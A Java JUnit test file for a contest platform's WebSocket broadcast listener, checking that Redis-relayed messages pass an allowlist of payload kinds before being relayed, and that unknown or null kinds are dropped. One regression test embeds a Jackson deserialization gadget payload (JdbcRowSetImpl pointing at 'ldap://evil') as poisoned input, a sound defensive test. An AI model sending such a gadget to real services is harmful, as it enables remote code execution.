package com.ulticode.modules.websocket.broadcast;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.ulticode.app.api.dto.NotificationPayload;
import com.ulticode.modules.websocket.event.ContestStatusEvent;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.data.redis.connection.DefaultMessage;

import java.nio.charset.StandardCharsets;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.verifyNoInteractions;

@ExtendWith(MockitoExtension.class)
@DisplayName("WebSocketBroadcastListener")
class WebSocketBroadcastListenerTest {

  @Mock private org.springframework.messaging.simp.SimpMessagingTemplate messagingTemplate;

  private ObjectMapper objectMapper;
  private WebSocketBroadcastListener listener;

  @BeforeEach
  void setUp() {
    objectMapper = new ObjectMapper().findAndRegisterModules();
    listener = new WebSocketBroadcastListener(messagingTemplate, objectMapper);
  }

  @Test
  @DisplayName("onMessage deserializes BROADCAST message via allowlist and relays to convertAndSend")
  void onMessage_relaysBroadcastMessage() throws Exception {
    ContestStatusEvent payload =
        new ContestStatusEvent("c-100", ContestStatusEvent.ContestStatus.RUNNING, null, null, "Go!");
    String payloadJson = objectMapper.writeValueAsString(payload);
    WebSocketBroadcastMessage msg =
        new WebSocketBroadcastMessage(
            WebSocketBroadcastMessage.Type.BROADCAST,
            "/topic/contest/c-100/status",
            null,
            payloadJson,
            WebSocketPayloadKind.CONTEST_STATUS.wire());
    String msgJson = objectMapper.writeValueAsString(msg);

    DefaultMessage redisMsg = new DefaultMessage("ulticode:ws:broadcast".getBytes(), msgJson.getBytes(StandardCharsets.UTF_8));
    listener.onMessage(redisMsg, null);

    ArgumentCaptor<Object> captor = ArgumentCaptor.forClass(Object.class);
    verify(messagingTemplate).convertAndSend(eq("/topic/contest/c-100/status"), captor.capture());

    assertThat(captor.getValue()).isInstanceOf(ContestStatusEvent.class);
    ContestStatusEvent received = (ContestStatusEvent) captor.getValue();
    assertThat(received.contestId()).isEqualTo("c-100");
    assertThat(received.status()).isEqualTo(ContestStatusEvent.ContestStatus.RUNNING);
  }

  @Test
  @DisplayName("onMessage deserializes USER message via allowlist and relays to convertAndSendToUser")
  void onMessage_relaysUserMessage() throws Exception {
    NotificationPayload payload = NotificationPayload.system("n-1", "Title", "Body");
    String payloadJson = objectMapper.writeValueAsString(payload);
    WebSocketBroadcastMessage msg =
        new WebSocketBroadcastMessage(
            WebSocketBroadcastMessage.Type.USER,
            "/queue/notification",
            "u-99",
            payloadJson,
            WebSocketPayloadKind.NOTIFICATION.wire());
    String msgJson = objectMapper.writeValueAsString(msg);

    DefaultMessage redisMsg = new DefaultMessage("ulticode:ws:broadcast".getBytes(), msgJson.getBytes(StandardCharsets.UTF_8));
    listener.onMessage(redisMsg, null);

    ArgumentCaptor<Object> captor = ArgumentCaptor.forClass(Object.class);
    verify(messagingTemplate).convertAndSendToUser(eq("u-99"), eq("/queue/notification"), captor.capture());
    assertThat(captor.getValue()).isInstanceOf(NotificationPayload.class);
  }

  /**
   * Malicious-input regression (AGENTS.md: security-sensitive relay). A poisoned message carrying
   * a {@code kind} that is NOT in {@link WebSocketPayloadKind} must be dropped before any payload
   * deserialization, so a publisher that gained write access to the broadcast channel cannot drive
   * arbitrary classpath instantiation.
   */
  @Test
  @DisplayName("onMessage drops message with unknown/poisoned kind without deserializing payload")
  void onMessage_unknownKind_isDropped() throws Exception {
    // Payload body deliberately looks like a gadget attempt; it must never be deserialized.
    String gadgetPayload =
        "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil\",\"autoCommit\":true}";
    WebSocketBroadcastMessage msg =
        new WebSocketBroadcastMessage(
            WebSocketBroadcastMessage.Type.BROADCAST,
            "/topic/contest/c-x/status",
            null,
            gadgetPayload,
            "com.sun.rowset.JdbcRowSetImpl"); // unknown kind wire string
    String msgJson = objectMapper.writeValueAsString(msg);

    DefaultMessage redisMsg = new DefaultMessage("ulticode:ws:broadcast".getBytes(), msgJson.getBytes(StandardCharsets.UTF_8));
    listener.onMessage(redisMsg, null);

    // No STOMP relay happened — the message was dropped at the allowlist gate.
    verify(messagingTemplate, org.mockito.Mockito.never())
        .convertAndSend(anyString(), (Object) any());
    verify(messagingTemplate, org.mockito.Mockito.never())
        .convertAndSendToUser(anyString(), anyString(), any());
  }

  @Test
  @DisplayName("onMessage drops message with null kind without deserializing payload")
  void onMessage_nullKind_isDropped() throws Exception {
    WebSocketBroadcastMessage msg =
        new WebSocketBroadcastMessage(
            WebSocketBroadcastMessage.Type.BROADCAST,
            "/topic/contest/c-y/status",
            null,
            "{}",
            null);
    String msgJson = objectMapper.writeValueAsString(msg);

    DefaultMessage redisMsg = new DefaultMessage("ulticode:ws:broadcast".getBytes(), msgJson.getBytes(StandardCharsets.UTF_8));
    listener.onMessage(redisMsg, null);

    verifyNoInteractions(messagingTemplate);
  }
}
